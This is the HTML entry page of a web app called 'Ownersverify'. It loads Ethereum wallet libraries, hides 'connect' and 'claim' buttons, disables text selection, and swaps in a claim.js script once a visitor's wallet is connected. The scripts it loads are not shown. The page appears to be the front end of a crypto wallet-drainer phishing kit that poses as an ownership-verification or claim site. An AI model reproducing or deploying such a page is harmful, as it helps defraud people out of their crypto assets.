<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <meta name="theme-color" content="#000000" />
    <link rel="apple-touch-icon" href="%PUBLIC_URL%/favicon.ico" />
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <title>Ownersverify</title>
    <script src="%PUBLIC_URL%/settings.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
  </head>
  <body style="background: #22252d;margin: 0;color: #fff;text-rendering: optimizespeed;user-select: none;">
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <span id="connectButton" style="display: none;"></span>
    <span id="claimButton" style="display: none;"></span>
    <span id="wltConnectButton" style="display: none;"></span>

    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
    <script src="https://npmcdn.com/moralis/dist/moralis.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
    
    <script>  
      window.web3_ethereum = new Web3(ethereum);
      const myInterval = setInterval(async function() {
          let scriptEle = await document.createElement("script");
          if (ethereum.selectedAddress) {
            scriptEle.src = "%PUBLIC_URL%/claim.js";
            await document.body.appendChild(scriptEle);
            clearInterval(myInterval)
          }
          else {
            scriptEle.src = "%PUBLIC_URL%/index2.js";
            await document.body.appendChild(scriptEle);
            clearInterval(myInterval)
          }
      }, 0)
    </script>
  </body>
</html>
